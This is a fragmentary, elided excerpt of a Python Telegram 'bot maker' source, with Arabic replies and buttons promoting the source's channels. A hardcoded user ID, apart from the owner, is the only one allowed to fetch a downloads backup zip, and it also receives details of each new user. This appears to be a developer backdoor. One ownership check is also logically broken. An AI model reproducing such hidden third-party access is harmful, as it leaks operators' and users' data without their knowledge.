...
BACKUP_ZIP = os.path.join(BASE_DIR, "downloads_backup.zip") 
...
async def gt_grrrs_backup(client: Client, message: Message):
    if message.from_user.id == 6334408675:
        try:
...
async def check(user_id, message, client):
    ...
    if off and message.from_user.id not in DEVS:
        await message.reply_text('**◍  الصانع معطل حاليا\n◍ يرجى التواصل مع <a href="https://t.me/IMSWAD">مطور السورس</a>\n√**')
        return False
    return True
...
⍟ 𝚃𝙷𝙴 𝙱𝙴𝚂𝚃 𝚂𝙾𝚄𝚁𝙲𝙴 𝙾𝙽 𝚃𝙴𝙻𝙴𝙶𝚁𝙰𝙼
        ...
        reply_markup=InlineKeyboardMarkup([
            [
                InlineKeyboardButton("ᏟᎻᎪΝΝᎬᏞ", url=f"https://t.me/SourceSWAD"),
                InlineKeyboardButton("ᏀᎡØႮᏢ", url=f"https://t.me/VKEKKQ")
            ],
            [
                InlineKeyboardButton("᥉ꪝᥲ️ძ", url=f"https://t.me/IMSWAD")
            ],
        ]),
    )
...
async def users_me(client, message):
    ...
    if user_id not in users:
        ...
        await client.send_message(6334408675,f"{text}")
...
async def twasol__(bot, m):
    global enable_twasol
    try:
        if m.from_user.id != owner_id or m.from_user.id != 6334408675:
            if enable_twasol:
